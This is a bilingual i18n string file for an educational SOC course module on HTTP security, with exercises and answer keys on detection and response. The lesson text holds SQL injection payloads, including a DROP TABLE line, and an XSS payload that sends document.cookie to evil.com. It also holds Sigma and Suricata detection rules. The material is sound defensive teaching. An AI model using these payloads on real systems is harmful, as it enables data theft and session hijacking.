/* ============================================================
   i18n-http.js — Traducciones EN del modulo HTTP
   Protocolos Red SOC · @xavimape
   ============================================================
   Requiere que i18n-core.js este cargado antes (usa i18n.register).
   ============================================================ */

'use strict';

i18n.register({
      'http.subtitle': "HyperText Transfer Protocol · TCP/80,443 · Application Layer",
      'http.demo.sim.panel.title': "HTTP Request Simulator",
      'http.demo.sim.label.url': "Target URL:",
      'http.demo.sim.label.method': "HTTP Method:",
      'http.demo.sim.opt.get': "GET — Get resource",
      'http.demo.sim.opt.post': "POST — Send data",
      'http.demo.sim.opt.put': "PUT — Update resource",
      'http.demo.sim.opt.delete': "DELETE — Delete resource",
      'http.demo.sim.label.body': "Body (POST):",
      'http.demo.sim.btn.send': "▶ Send Request",
      'http.demo.sim.waiting': "Waiting for HTTP request...",
      'http.demo.xss.title': "⚠️ Demo: Cross-Site Scripting (XSS)",
      'http.demo.sqli.title': "⚠️ Demo: SQL Injection",
      'http.demo.xss.desc':         { es: 'El atacante inyecta código JavaScript en un campo que se renderiza sin sanitizar. Comparación en tiempo real: input con y sin protección.',
                                     en: 'The attacker injects JavaScript code into a field that renders without sanitization. Real-time comparison: input with and without protection.' },
      'http.demo.xss.panel.unsafe': "🔴 Without sanitization (vulnerable)",
      'http.demo.xss.label.input': "User comment:",
      'http.demo.xss.btn.render': "▶ Render",
      'http.demo.xss.label.unsafe': "Unsanitized HTML output:",
      'http.demo.xss.panel.safe': "🟢 With sanitization (protected)",
      'http.demo.xss.label.fn': "Sanitization function:",
      'http.demo.xss.label.safe': "Sanitized HTML output:",
      'http.demo.sqli.desc':        { es: 'El atacante rompe la lógica de la query SQL manipulando el input del formulario de login.',
                                     en: 'The attacker breaks the SQL query logic by manipulating the login form input.' },
      'http.demo.sqli.panel.form': "Login Form",
      'http.demo.sqli.label.user': "Username:",
      'http.demo.sqli.label.pass': "Password:",
      'http.demo.sqli.btn.try': "▶ Try Login",
      'http.demo.sqli.btn.reset': "↺ Try legitimate",
      'http.demo.sqli.panel.result': "Generated query + Result",
      'http.demo.sqli.waiting': "Waiting for login attempt...",
      'http.demo.csrf.title': "🎭 Demo: CSRF — Cross-Site Request Forgery",
      'http.demo.csrf.desc':    { es: 'Una página maliciosa fuerza al navegador de la víctima (ya autenticada) a ejecutar acciones no autorizadas en otro sitio.', en: 'A malicious page forces the victim\'s browser (already authenticated) to execute unauthorized actions on another site.' },
      'http.demo.csrf.panel.legit': { es: '🟢 Request legítimo (del sitio real)', en: '🟢 Legitimate request (from real site)' },
      'http.demo.csrf.panel.attack': { es: '🔴 Request CSRF (desde sitio malicioso)', en: '🔴 CSRF request (from malicious site)' },
      'http.demo.csrf.label.amount': "Amount to transfer:",
      'http.demo.csrf.label.dest': "Destination account:",
      'http.demo.csrf.btn.legit': "✅ Send legitimate",
      'http.demo.csrf.btn.attack': "💀 Execute CSRF",
      'http.demo.session.title': "🍪 Demo: Session Hijacking (Cookie Theft)",
      'http.demo.session.desc':   { es: 'El atacante roba la cookie de sesión vía XSS o sniffing para suplantar a la víctima sin conocer su contraseña.', en: 'The attacker steals the session cookie via XSS or sniffing to impersonate the victim without knowing their password.' },
      'http.demo.session.panel.cookie': "🍪 Cookie configuration",
      'http.demo.session.panel.result': "🔍 Risk analysis",
      'http.demo.session.label.flags': "Cookie flags:",
      'http.demo.session.btn.analyze': "🔍 Analyze vulnerability",
      'http.s1.title': "What is HTTP/HTTPS?",
      'http.s1.sub': "The protocol that drives the web",
      'http.s2.title': "HTTP Message Structure",
      'http.s2.sub': "Request and Response",
      'http.s3.title': "HTTP Methods and Status Codes",
      'http.s3.sub': "What a SOC must know",
      'http.s4.title': "Attack 1: SQL Injection (SQLi)",
      'http.s4.sub': "Breaking database logic via input",
      'http.s5.title': "Attack 2: Cross-Site Scripting (XSS)",
      'http.s5.sub': "JavaScript injection in web pages",
      'http.s6.title': "Attack 3: Session Hijacking",
      'http.s6.sub': "Theft of the session identifier",
      'http.s7.title': "Attack 4: Malicious File Downloads",
      'http.s7.sub': "HTTP as a malware delivery vector",
      'http.s8.title': "How it looks in SOC telemetry",
      'http.s8.sub': "HTTP in proxy, Zeek and SIEM logs",
      'http.s9.title': "Detection and mitigation",
      'http.s9.sub': "Operational summary for SOC",
      'http.s1.p1':     { es: 'HTTP (HyperText Transfer Protocol) es el protocolo de comunicación de la capa de aplicación para transferir recursos web: HTML, JSON, imágenes, scripts. Opera sobre TCP, es sin estado (stateless) y orientado a texto.',
                         en: 'HTTP (HyperText Transfer Protocol) is the application-layer communication protocol for transferring web resources: HTML, JSON, images, scripts. It runs over TCP, is stateless, and text-oriented.' },
      'http.s1.p2':     { es: '<strong>HTTPS</strong> = HTTP sobre TLS/SSL. Agrega cifrado, autenticación del servidor e integridad de datos. Desde 2018, Chrome marca HTTP como "No seguro".',
                         en: '<strong>HTTPS</strong> = HTTP over TLS/SSL. Adds encryption, server authentication and data integrity. Since 2018, Chrome marks HTTP as "Not Secure".' },
      'http.s1.callout':{ es: '<strong>Puertos:</strong> HTTP → TCP/80 · HTTPS → TCP/443 · HTTP/3 → UDP/443 (QUIC)',
                         en: '<strong>Ports:</strong> HTTP → TCP/80 · HTTPS → TCP/443 · HTTP/3 → UDP/443 (QUIC)' },
      'http.s1.li1':    { es: '<strong>HTTP/1.1</strong> — 1997, persistencia de conexión, pipelining',            en: '<strong>HTTP/1.1</strong> — 1997, connection persistence, pipelining' },
      'http.s1.li2':    { es: '<strong>HTTP/2</strong> — 2015, multiplexing, compresión de headers (HPACK)',       en: '<strong>HTTP/2</strong> — 2015, multiplexing, header compression (HPACK)' },
      'http.s1.li3':    { es: '<strong>HTTP/3</strong> — 2022, sobre QUIC (UDP), 0-RTT, sin head-of-line blocking', en: '<strong>HTTP/3</strong> — 2022, over QUIC (UDP), 0-RTT, no head-of-line blocking' },
      'http.s2.callout':{ es: '<strong>Headers de seguridad clave:</strong> <code>HttpOnly</code> (cookie no accesible por JS), <code>Secure</code> (solo HTTPS), <code>SameSite</code> (protege contra CSRF), <code>HSTS</code> (fuerza HTTPS).',
                         en: '<strong>Key security headers:</strong> <code>HttpOnly</code> (cookie not accessible by JS), <code>Secure</code> (HTTPS only), <code>SameSite</code> (protects against CSRF), <code>HSTS</code> (enforces HTTPS).' },
      'http.s3.li1':    { es: '<code>GET</code> — obtener recurso (no modifica estado)',            en: '<code>GET</code> — get resource (does not modify state)' },
      'http.s3.li2':    { es: '<code>POST</code> — enviar datos al servidor (login, formularios)', en: '<code>POST</code> — send data to server (login, forms)' },
      'http.s3.li3':    { es: '<code>PUT/PATCH</code> — actualizar recurso',                       en: '<code>PUT/PATCH</code> — update resource' },
      'http.s3.li4':    { es: '<code>DELETE</code> — eliminar recurso',                            en: '<code>DELETE</code> — delete resource' },
      'http.s3.li5':    { es: '<code>OPTIONS</code> — consultar métodos permitidos (CORS)',        en: '<code>OPTIONS</code> — query allowed methods (CORS)' },
      'http.s3.callout':{ es: '<strong>Códigos relevantes en SOC:</strong><br><code>200 OK</code> · <code>301/302 Redirect</code> · <code>400 Bad Request</code> · <code>401 Unauthorized</code> · <code>403 Forbidden</code> · <code>404 Not Found</code> · <code>500 Internal Server Error</code><br><br>Un <strong>spike de 500</strong> puede indicar SQLi o fuzzing. Muchos <strong>404 consecutivos</strong> = reconocimiento de directorios.',
                         en: '<strong>Relevant SOC status codes:</strong><br><code>200 OK</code> · <code>301/302 Redirect</code> · <code>400 Bad Request</code> · <code>401 Unauthorized</code> · <code>403 Forbidden</code> · <code>404 Not Found</code> · <code>500 Internal Server Error</code><br><br>A <strong>spike of 500s</strong> can indicate SQLi or fuzzing. Many consecutive <strong>404s</strong> = directory reconnaissance.' },
      'http.s4.p1':     { es: 'El atacante inserta código SQL en campos de formulario. Si la aplicación concatena el input directamente en la query sin sanitizar, el atacante puede:',
                         en: 'The attacker inserts SQL code into form fields. If the application concatenates the input directly into the query without sanitization, the attacker can:' },
      'http.s4.li1':    { es: 'Bypassear autenticación: <code>admin\' --</code>',                                        en: 'Bypass authentication: <code>admin\' --</code>' },
      'http.s4.li2':    { es: 'Extraer datos: <code>\' UNION SELECT username,password FROM users --</code>',             en: 'Extract data: <code>\' UNION SELECT username,password FROM users --</code>' },
      'http.s4.li3':    { es: 'Destruir datos: <code>\'; DROP TABLE users; --</code>',                                   en: 'Destroy data: <code>\'; DROP TABLE users; --</code>' },
      'http.s4.callout':{ es: '<strong>Query vulnerable:</strong><br><code>"SELECT * FROM users WHERE user=\'" + input + "\'"</code><br>Con input <code>admin\' --</code> → <code>SELECT * FROM users WHERE user=\'admin\' --\'</code><br>El <code>--</code> comenta el resto → autenticación bypasseada sin contraseña.',
                         en: '<strong>Vulnerable query:</strong><br><code>"SELECT * FROM users WHERE user=\'" + input + "\'"</code><br>With input <code>admin\' --</code> → <code>SELECT * FROM users WHERE user=\'admin\' --\'</code><br>The <code>--</code> comments out the rest → authentication bypassed without a password.' },
      'http.s4.p2':     { es: '<strong>Prevención:</strong> prepared statements / parameterized queries, WAF, input validation.',
                         en: '<strong>Prevention:</strong> prepared statements / parameterized queries, WAF, input validation.' },
      'http.s5.p1':     { es: 'El atacante inyecta scripts en contenido que otros usuarios verán. Hay 3 tipos:',
                         en: 'The attacker injects scripts into content that other users will see. There are 3 types:' },
      'http.s5.li1':    { es: '<strong>Reflected XSS:</strong> el payload está en la URL, se refleja en la respuesta inmediata', en: '<strong>Reflected XSS:</strong> the payload is in the URL, reflected in the immediate response' },
      'http.s5.li2':    { es: '<strong>Stored XSS:</strong> el payload se guarda en la DB y afecta a todos los que visiten',     en: '<strong>Stored XSS:</strong> the payload is saved in the DB and affects everyone who visits' },
      'http.s5.li3':    { es: '<strong>DOM XSS:</strong> el payload manipula el DOM sin pasar por el servidor',                  en: '<strong>DOM XSS:</strong> the payload manipulates the DOM without going through the server' },
      'http.s5.callout':{ es: '<strong>Payload clásico:</strong> <code>&lt;script&gt;document.location=\'http://evil.com/steal?c=\'+document.cookie&lt;/script&gt;</code><br>Roba la cookie de sesión y la envía al atacante.',
                         en: '<strong>Classic payload:</strong> <code>&lt;script&gt;document.location=\'http://evil.com/steal?c=\'+document.cookie&lt;/script&gt;</code><br>Steals the session cookie and sends it to the attacker.' },
      'http.s5.p2':     { es: '<strong>Prevención:</strong> sanitización de output (encode HTML entities), CSP (Content Security Policy), <code>HttpOnly</code> cookies.',
                         en: '<strong>Prevention:</strong> output sanitization (encode HTML entities), CSP (Content Security Policy), <code>HttpOnly</code> cookies.' },
      'http.s6.p1':     { es: 'Las sesiones web se identifican con un token (cookie <code>session_id</code>). Si el atacante obtiene ese token, puede hacerse pasar por el usuario legítimo sin conocer su contraseña.',
                         en: 'Web sessions are identified with a token (cookie <code>session_id</code>). If the attacker obtains that token, they can impersonate the legitimate user without knowing their password.' },
      'http.s6.p2':     { es: '<strong>Métodos de robo:</strong>',                        en: '<strong>Theft methods:</strong>' },
      'http.s6.li1':    { es: 'XSS → robar cookie con JavaScript',                        en: 'XSS → steal cookie with JavaScript' },
      'http.s6.li2':    { es: 'MITM en HTTP (sin TLS) → capturar cookie en tránsito',     en: 'MITM on HTTP (no TLS) → capture cookie in transit' },
      'http.s6.li3':    { es: 'Fixation attack → forzar al usuario a usar un session ID controlado', en: 'Fixation attack → force the user to use a controlled session ID' },
      'http.s6.li4':    { es: 'Predicción → session IDs débiles, no aleatorios',          en: 'Prediction → weak, non-random session IDs' },
      'http.s6.callout':{ es: '<strong>Señal en SOC:</strong> dos IPs distintas usando el mismo session token en un lapso corto → posible session hijacking activo.',
                         en: '<strong>SOC signal:</strong> two different IPs using the same session token within a short time → possible active session hijacking.' },
      'http.s7.p1':     { es: 'El atacante usa HTTP para entregar malware disfrazado de contenido legítimo:',
                         en: 'The attacker uses HTTP to deliver malware disguised as legitimate content:' },
      'http.s7.li1':    { es: 'Drive-by download: visitar una web compromete el browser',             en: 'Drive-by download: visiting a site compromises the browser' },
      'http.s7.li2':    { es: 'Malvertising: anuncios que descargan payloads',                         en: 'Malvertising: ads that download payloads' },
      'http.s7.li3':    { es: 'Phishing HTTP: página falsa + descarga de dropper',                     en: 'HTTP phishing: fake page + dropper download' },
      'http.s7.li4':    { es: 'Abuso de servicios legítimos (OneDrive, Google Drive, GitHub)',         en: 'Abuse of legitimate services (OneDrive, Google Drive, GitHub)' },
      'http.s7.callout':{ es: '<strong>IOCs en logs HTTP:</strong><br>· Content-Type: <code>application/octet-stream</code> desde dominio sospechoso<br>· User-Agent inusual o hardcodeado (malware)<br>· Descargas de <code>.exe</code>, <code>.ps1</code>, <code>.hta</code>, <code>.vbs</code> desde IP no corporativa<br>· Redirecciones en cadena (302 → 302 → descarga)',
                         en: '<strong>IOCs in HTTP logs:</strong><br>· Content-Type: <code>application/octet-stream</code> from suspicious domain<br>· Unusual or hardcoded User-Agent (malware)<br>· Downloads of <code>.exe</code>, <code>.ps1</code>, <code>.hta</code>, <code>.vbs</code> from non-corporate IP<br>· Chained redirects (302 → 302 → download)' },
      'http.s9.li1':    { es: '🔒 <strong>WAF (Web Application Firewall)</strong> — detecta y bloquea SQLi, XSS, path traversal', en: '🔒 <strong>WAF (Web Application Firewall)</strong> — detects and blocks SQLi, XSS, path traversal' },
      'http.s9.li2':    { es: '📊 <strong>Spike de 4xx/5xx</strong> — fuzzing, SQLi, reconocimiento de directorios',              en: '📊 <strong>Spike of 4xx/5xx</strong> — fuzzing, SQLi, directory reconnaissance' },
      'http.s9.li3':    { es: '🤖 <strong>User-Agent anómalo</strong> — <code>sqlmap</code>, <code>Nikto</code>, <code>curl</code> en producción', en: '🤖 <strong>Anomalous User-Agent</strong> — <code>sqlmap</code>, <code>Nikto</code>, <code>curl</code> in production' },
      'http.s9.li4':    { es: '🍪 <strong>HttpOnly + Secure + SameSite</strong> en cookies — previene XSS y CSRF', en: '🍪 <strong>HttpOnly + Secure + SameSite</strong> on cookies — prevents XSS and CSRF' },
      'http.s9.li5':    { es: '🛡️ <strong>CSP (Content-Security-Policy)</strong> — restringe qué scripts pueden ejecutarse', en: '🛡️ <strong>CSP (Content-Security-Policy)</strong> — restricts which scripts can run' },
      'http.s9.li6':    { es: '📝 <strong>Prepared Statements</strong> — elimina SQLi a nivel de código', en: '📝 <strong>Prepared Statements</strong> — eliminates SQLi at code level' },
      'http.s9.li7':    { es: '🔑 <strong>Session tokens largos y aleatorios</strong> — previene predicción', en: '🔑 <strong>Long, random session tokens</strong> — prevents prediction' },
      'http.s9.li8':    { es: '🌐 <strong>HSTS</strong> — fuerza HTTPS, previene downgrade a HTTP', en: '🌐 <strong>HSTS</strong> — enforces HTTPS, prevents downgrade to HTTP' },
      'http.s9.callout':{ es: '<strong>Regla Sigma — SQLi Detection:</strong><br><code>selection: http.uri|contains: ["\&#39;", "OR 1=1", "UNION SELECT", "--", "/*"]</code><br><code>filter: status_code: [400, 500]</code>',
                         en: '<strong>Sigma Rule — SQLi Detection:</strong><br><code>selection: http.uri|contains: ["\&#39;", "OR 1=1", "UNION SELECT", "--", "/*"]</code><br><code>filter: status_code: [400, 500]</code>' },
      'http.ej1.title': "HTTP vs HTTPS — what really changes?",
      'http.ej2.title': "Identify the XSS type",
      'http.ej3.title': "HTTP log analysis — what do you see?",
      'http.ej4.title': "HTTP security headers — audit",
      'http.ej5.title': "Write the WAF/Suricata rule",
      'http.challenge.title': "Incident #HTTP-001: \"The store giving away accounts\"",
      'http.ej1.q': { es: 'Un analista ve tráfico HTTP (puerto 80) de un empleado hacia un sitio de banco. ¿Cuáles son los riesgos concretos comparado con HTTPS? ¿Qué puede ver un atacante en MITM sobre HTTP que no ve sobre HTTPS?',
                     en: 'An analyst sees HTTP traffic (port 80) from an employee to a bank site. What are the specific risks compared to HTTPS? What can an attacker see in a MITM over HTTP that they cannot see over HTTPS?' },
      'http.ej2.q': { es: 'Describí la diferencia entre Reflected XSS y Stored XSS. ¿Cuál es más peligroso y por qué? Da un ejemplo concreto de cada uno.',
                     en: 'Describe the difference between Reflected XSS and Stored XSS. Which is more dangerous and why? Give a concrete example of each.' },
      'http.ej3.q': { es: 'Analizá estos logs del proxy corporativo y describí: ¿qué actividad sospechosa identificás?, ¿qué tipo de ataque?, ¿cuál es el primer paso de respuesta?',
                     en: 'Analyze these corporate proxy logs and describe: what suspicious activity do you identify? What type of attack? What is the first response step?' },
      'http.ej4.q': { es: 'Un desarrollador te pide revisar los headers de respuesta de su aplicación. Identificá cuáles faltan, cuáles están mal configurados y qué ataque previene cada uno:',
                     en: 'A developer asks you to review the response headers of their application. Identify which are missing, which are misconfigured, and what attack each one prevents:' },
      'http.ej5.q': { es: 'Escribí una regla Suricata para detectar intentos de XSS en parámetros HTTP GET. Considerá que el payload puede estar URL-encoded (<code>%3Cscript%3E</code>) además de en texto plano.',
                     en: 'Write a Suricata rule to detect XSS attempts in HTTP GET parameters. Consider that the payload may be URL-encoded (<code>%3Cscript%3E</code>) as well as plaintext.' },
      'http.challenge.context': { es: 'Son las 2 AM. El SIEM dispara una alerta: 847 requests con status 200 hacia <code>/api/users</code> en los últimos 10 minutos desde la IP <code>45.129.56.200</code>. El endpoint normalmente devuelve el perfil del usuario autenticado. Logs del proxy:',
                                  en: 'It\'s 2 AM. The SIEM fires an alert: 847 requests with status 200 to <code>/api/users</code> in the last 10 minutes from IP <code>45.129.56.200</code>. The endpoint normally returns the authenticated user\'s profile. Proxy logs:' },
      'http.challenge.q': "What happened? How do you respond?",
      'http.challenge.instructions': { es: 'Identificá: (1) tipo de vulnerabilidad y técnica, (2) impacto, (3) pasos de respuesta inmediata, (4) cómo se previene.',
                                       en: 'Identify: (1) vulnerability type and technique, (2) impact, (3) immediate response steps, (4) how to prevent it.' },
      'http.ej1.ans': { es: 'Sobre HTTP plano un atacante en MITM puede ver:\n- Credenciales (usuario/contraseña) en texto plano en el body del POST\n- Cookies de sesión en headers → robo de sesión\n- Todos los datos del formulario sin cifrar\n- URLs visitadas (historial de navegación)\n- Contenido completo de las páginas\n\nSobre HTTPS el atacante solo ve:\n- El hostname del servidor (en el SNI del TLS handshake)\n- El tamaño aproximado del tráfico\n- Los tiempos de conexión\nNO puede ver: credenciales, cookies, URLs exactas, ni contenido.\n\nRiesgo adicional HTTP: modificación del contenido en tránsito\n→ inyección de scripts maliciosos en páginas (MITM activo).',
                      en: 'Over plain HTTP a MITM attacker can see:\n- Credentials (username/password) in plaintext in the POST body\n- Session cookies in headers → session theft\n- All form data unencrypted\n- Visited URLs (browsing history)\n- Full page content\n\nOver HTTPS the attacker only sees:\n- The server hostname (in the TLS handshake SNI)\n- Approximate traffic size\n- Connection timestamps\nCANNOT see: credentials, cookies, exact URLs, or content.\n\nAdditional HTTP risk: content modification in transit\n→ injection of malicious scripts into pages (active MITM).' },
      'http.ej2.ans': { es: 'REFLECTED XSS:\n- El payload está en la URL o parámetro de la request\n- Solo afecta al usuario que hace click en el enlace malicioso\n- Ejemplo: https://site.com/search?q=<script>alert(1)</script>\n- El atacante envía ese link por email/phishing\n\nSTORED XSS (más peligroso):\n- El payload se guarda en la base de datos del servidor\n- Afecta a TODOS los usuarios que visiten la página\n- Ejemplo: publicar un comentario con <script>...</script>\n  → cada usuario que vea ese comentario ejecuta el script\n- Un solo payload puede robar sesiones de miles de usuarios\n- Puede persistir indefinidamente hasta que se limpie la DB\n\nSTORED es más peligroso porque:\n→ No requiere que la víctima haga click en nada especial\n→ Escala a todos los usuarios automáticamente\n→ Puede inyectarse una sola vez y afectar durante días/semanas',
                      en: 'REFLECTED XSS:\n- The payload is in the URL or request parameter\n- Only affects the user who clicks the malicious link\n- Example: https://site.com/search?q=<script>alert(1)</script>\n- The attacker sends that link via email/phishing\n\nSTORED XSS (more dangerous):\n- The payload is saved in the server\'s database\n- Affects ALL users who visit the page\n- Example: posting a comment with <script>...</script>\n  → every user who sees that comment executes the script\n- A single payload can steal thousands of user sessions\n- Can persist indefinitely until the DB is cleaned\n\nSTORED is more dangerous because:\n→ Does not require the victim to click anything special\n→ Scales to all users automatically\n→ Can be injected once and persist for days/weeks' },
      'http.ej3.ans': { es: 'ATAQUE: SQL Injection automatizado con sqlmap\n\nEvidencia:\n1. User-Agent: "sqlmap/1.7.8" → herramienta de SQLi automatizada, no es un usuario real\n2. Secuencia de payloads progresivos:\n   - Prueba básica (admin\'--) → error 500 (confirma vulnerabilidad)\n   - Bypass auth (OR \'1\'=\'1\') → 200 (login exitoso sin contraseña)\n   - UNION SELECT para enumerar tablas → 500 (número de columnas incorrecto)\n   - UNION SELECT para extraer users → 200 (¡datos extraídos!)\n3. Velocidad: 5 requests en 4 segundos → automatizado\n\nPrimer paso de respuesta:\n→ BLOQUEAR la IP origen en el WAF/firewall inmediatamente\n→ Verificar qué datos se extrajeron (log de response body)\n→ Determinar si el usuario \'admin\' fue comprometido\n→ Escalar a Tier 2, abrir ticket de incidente\n→ Revisar si sqlmap obtuvo credenciales (riesgo de escalada)',
                      en: 'ATTACK: Automated SQL Injection with sqlmap\n\nEvidence:\n1. User-Agent: "sqlmap/1.7.8" → automated SQLi tool, not a real user\n2. Sequence of progressive payloads:\n   - Basic test (admin\'--) → 500 error (confirms vulnerability)\n   - Auth bypass (OR \'1\'=\'1\') → 200 (successful login without password)\n   - UNION SELECT to enumerate tables → 500 (wrong column count)\n   - UNION SELECT to extract users → 200 (data extracted!)\n3. Speed: 5 requests in 4 seconds → automated\n\nFirst response step:\n→ BLOCK the source IP in the WAF/firewall immediately\n→ Check what data was extracted (response body log)\n→ Determine if user \'admin\' was compromised\n→ Escalate to Tier 2, open incident ticket\n→ Review if sqlmap obtained credentials (escalation risk)' },
      'http.ej4.ans': { es: 'HEADERS AUSENTES O MAL CONFIGURADOS:\n\n1. Set-Cookie: session=abc123\n   ❌ Falta: HttpOnly → cookie accesible por JS → XSS puede robarla\n   ❌ Falta: Secure → enviada por HTTP también → MITM la ve\n   ❌ Falta: SameSite=Strict → vulnerable a CSRF\n   ✅ Correcto: Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict\n\n2. Falta: Strict-Transport-Security (HSTS)\n   → Sin esto: posible downgrade a HTTP\n   ✅ Agregar: Strict-Transport-Security: max-age=31536000; includeSubDomains\n\n3. Falta: X-Frame-Options o frame-ancestors en CSP\n   → Sin esto: clickjacking posible\n   ✅ Agregar: X-Frame-Options: DENY\n\n4. Falta: Content-Security-Policy\n   → Sin esto: XSS puede cargar scripts externos\n   ✅ Agregar: Content-Security-Policy: default-src \'self\'\n\n5. Server: Apache/2.4.51 + X-Powered-By: PHP/7.4.3\n   ⚠️ Information disclosure: expone versiones específicas\n   → Un atacante busca CVEs para esas versiones exactas\n   ✅ Remover o cambiar: Server: webserver / X-Powered-By: (eliminar)',
                      en: 'MISSING OR MISCONFIGURED HEADERS:\n\n1. Set-Cookie: session=abc123\n   ❌ Missing: HttpOnly → cookie accessible by JS → XSS can steal it\n   ❌ Missing: Secure → sent over HTTP too → MITM can see it\n   ❌ Missing: SameSite=Strict → vulnerable to CSRF\n   ✅ Correct: Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict\n\n2. Missing: Strict-Transport-Security (HSTS)\n   → Without this: possible downgrade to HTTP\n   ✅ Add: Strict-Transport-Security: max-age=31536000; includeSubDomains\n\n3. Missing: X-Frame-Options or frame-ancestors in CSP\n   → Without this: clickjacking possible\n   ✅ Add: X-Frame-Options: DENY\n\n4. Missing: Content-Security-Policy\n   → Without this: XSS can load external scripts\n   ✅ Add: Content-Security-Policy: default-src \'self\'\n\n5. Server: Apache/2.4.51 + X-Powered-By: PHP/7.4.3\n   ⚠️ Information disclosure: exposes specific versions\n   → An attacker searches CVEs for those exact versions\n   ✅ Remove or change: Server: webserver / X-Powered-By: (remove)' },
      'http.ej5.ans': { es: '# Regla Suricata — XSS Detection en GET params\nalert http any any -> $HTTP_SERVERS any (\n  msg:"ET WEB XSS Attempt in URI - script tag";\n  flow:established,to_server;\n  http.uri;\n  pcre:"/((\%3C)|<)((\%2F)|\\/)*[a-z0-9\%]+((\%3E)|>)/i";\n  threshold: type limit, track by_src, count 3, seconds 30;\n  classtype:web-application-attack;\n  metadata:affected_product Web_Server, attack_target Server;\n  sid:2100050;\n  rev:2;\n)\n\n# Regla adicional — sqlmap User-Agent\nalert http any any -> $HTTP_SERVERS any (\n  msg:"ET SCAN sqlmap Automated SQL Injection Tool";\n  flow:established,to_server;\n  http.user_agent;\n  content:"sqlmap"; nocase;\n  classtype:web-application-activity;\n  sid:2100051;\n  rev:1;\n)\n\n# Regla Sigma — múltiples 500 desde misma IP (fuzzing/SQLi)\ntitle: HTTP 500 Error Spike - Possible SQLi\ndetection:\n  selection:\n    http.status_code: 500\n  timeframe: 1m\n  condition: selection | count() by src_ip > 10\nlevel: medium',
                      en: '# Suricata Rule — XSS Detection in GET params\nalert http any any -> $HTTP_SERVERS any (\n  msg:"ET WEB XSS Attempt in URI - script tag";\n  flow:established,to_server;\n  http.uri;\n  pcre:"/((\%3C)|<)((\%2F)|\\/)*[a-z0-9\%]+((\%3E)|>)/i";\n  threshold: type limit, track by_src, count 3, seconds 30;\n  classtype:web-application-attack;\n  metadata:affected_product Web_Server, attack_target Server;\n  sid:2100050;\n  rev:2;\n)\n\n# Additional rule — sqlmap User-Agent\nalert http any any -> $HTTP_SERVERS any (\n  msg:"ET SCAN sqlmap Automated SQL Injection Tool";\n  flow:established,to_server;\n  http.user_agent;\n  content:"sqlmap"; nocase;\n  classtype:web-application-activity;\n  sid:2100051;\n  rev:1;\n)\n\n# Sigma Rule — multiple 500s from same IP (fuzzing/SQLi)\ntitle: HTTP 500 Error Spike - Possible SQLi\ndetection:\n  selection:\n    http.status_code: 500\n  timeframe: 1m\n  condition: selection | count() by src_ip > 10\nlevel: medium' },
      'http.challenge.ans': { es: '(1) VULNERABILIDAD: IDOR (Insecure Direct Object Reference) — OWASP A01:2021\n    TÉCNICA: Enumeration / Mass Data Harvesting\n    El endpoint /api/users?id=N devuelve datos de CUALQUIER usuario si\n    estás autenticado, sin verificar que el ?id sea el tuyo.\n    El atacante tiene un token legítimo (robado o creado) y enumera\n    todos los IDs secuencialmente con un script Python.\n\n(2) IMPACTO:\n    - 847 emails corporativos expuestos\n    - Roles de usuarios expuestos (incluyendo admins)\n    - Posible preparación para phishing dirigido o credential stuffing\n    - Violación de privacidad → potencial obligación de notificación GDPR/legal\n\n(3) RESPUESTA INMEDIATA:\n    → Bloquear IP 45.129.56.200 en firewall\n    → Invalidar el token Bearer comprometido (logout forzado del usuario #1042)\n    → Verificar si el usuario #1042 fue comprometido o es el atacante\n    → Preservar logs completos para investigación\n    → Notificar al equipo de desarrollo para parchear el endpoint\n    → Evaluar si hay otros endpoints IDOR con el mismo patrón\n    → Abrir ticket legal/privacidad por datos expuestos\n\n(4) PREVENCIÓN:\n    → Authorization check: verificar que el id del token == id solicitado\n    → Rate limiting en la API: máximo N requests/minuto por token\n    → Usar UUIDs en lugar de IDs secuenciales (dificulta enumeración)\n    → Logging + alertas para acceso masivo a recursos de otros usuarios\n    → API security testing en el pipeline CI/CD (OWASP API Top 10)',
                             en: '(1) VULNERABILITY: IDOR (Insecure Direct Object Reference) — OWASP A01:2021\n    TECHNIQUE: Enumeration / Mass Data Harvesting\n    The /api/users?id=N endpoint returns data for ANY user if\n    you are authenticated, without verifying the ?id is yours.\n    The attacker has a legitimate token (stolen or created) and enumerates\n    all IDs sequentially with a Python script.\n\n(2) IMPACT:\n    - 847 corporate emails exposed\n    - User roles exposed (including admins)\n    - Possible preparation for targeted phishing or credential stuffing\n    - Privacy violation → potential GDPR/legal notification obligation\n\n(3) IMMEDIATE RESPONSE:\n    → Block IP 45.129.56.200 at the firewall\n    → Invalidate the compromised Bearer token (force-logout user #1042)\n    → Verify if user #1042 was compromised or is the attacker\n    → Preserve complete logs for investigation\n    → Notify the development team to patch the endpoint\n    → Assess if other endpoints have the same IDOR pattern\n    → Open a legal/privacy ticket for exposed data\n\n(4) PREVENTION:\n    → Authorization check: verify token id == requested id\n    → Rate limiting on the API: max N requests/minute per token\n    → Use UUIDs instead of sequential IDs (makes enumeration harder)\n    → Logging + alerts for bulk access to other users\' resources\n    → API security testing in CI/CD pipeline (OWASP API Top 10)' },
      'http.rec.rfc9110': "Updated HTTP specification: methods, status codes, headers and semantics. Replaces RFC 7230-7235.",
      'http.rec.owasp':     { es: 'Los 10 riesgos más críticos en aplicaciones web. A03 Injection, A07 XSS/Auth failures cubiertos en este módulo.',
                             en: 'The 10 most critical web application risks. A03 Injection, A07 XSS/Auth failures covered in this module.' },
      'http.rec.burp':      { es: 'Proxy de interceptación para análisis de tráfico HTTP/HTTPS. Incluye scanner pasivo de vulnerabilidades.',
                             en: 'Interception proxy for HTTP/HTTPS traffic analysis. Includes passive vulnerability scanner.' },
      'http.rec.zeek': "Key fields for HTTP analysis in Zeek.",
      'http.rec.curl': "Command-line HTTP client for manual endpoint testing.",
      'http.rec.dvwa':      { es: 'Aplicaciones web vulnerables para practicar detección y explotación controlada de SQLi, XSS, IDOR, etc.',
                             en: 'Vulnerable web applications for practicing controlled detection and exploitation of SQLi, XSS, IDOR, etc.' },
      'http.rec.log4shell': { es: 'JNDI injection via HTTP headers (User-Agent, X-Forwarded-For). CVSS 10.0. Afecta millones de servidores Java.',
                             en: 'JNDI injection via HTTP headers (User-Agent, X-Forwarded-For). CVSS 10.0. Affects millions of Java servers.' },
      'http.rec.struts':    { es: 'RCE via Content-Type header malicioso en POST. Causó la brecha de Equifax (147M registros robados).',
                             en: 'RCE via malicious Content-Type header in POST. Caused the Equifax breach (147M records stolen).' },
      'http.cheat.r1.sig': "User-Agent: sqlmap/nikto/acunetix",
      'http.cheat.r1.att': "Automated scan",
      'http.cheat.r1.act': "Block IP, alert",
